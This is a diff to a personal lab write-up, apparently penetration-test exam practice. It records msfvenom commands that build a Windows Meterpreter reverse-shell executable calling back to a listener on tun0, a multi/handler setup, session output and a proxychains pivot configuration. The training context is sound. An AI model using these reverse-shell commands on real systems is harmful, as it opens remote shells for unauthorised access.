@@ -40,7 +40,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=10.50.
 Re-wget-ed the shell.exe and setup msfconsole multi/hander to listen for the connection back. Start a listener, set payload, configure options, bang head off the keys: E X P L O I T
 ```msfconsole
 use multi/handler
-set payload windows/meterpreter/reverse_tcp
+set payload windows/x64/meterpreter/reverse_tcp # corrected this to add x64
 set LHOST $LISTENING-IP
 set LPORT $LISTENING-PORT
 exploit
@@ -81,4 +81,20 @@ msf5 exploit(multi/handler) > sessions -i 6
 [*] Starting interaction with 6...
 
 [*] 10.200.102.219 - Command shell session 6 closed.
+```
+
+Went back and realised that the previous usage of any msfvenom payload required a tun0 connection:
+`msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o shell.exe`
+
+[meterSUCCESS](Screenshots/yd-meter-success.png)
+
+Now we can continue with the task. Big take away from this is the wonder of pre-setup and ironning out ANY network or system configuration many months before an exam. Also that the troubleshooting and networking I learnt from the pk100 was so helpful in both mindset and in knowledge to solve these problems. Better solve then once or twice now than later.
+
+[meterSUCCESS](Screenshots/yd-autoroute-setup.png)
+
+Configure the /etc/proxychains.conf
+
+```vim
+#socks4         127.0.0.1 9050
+socks4 127.0.0.1 1080
 ```
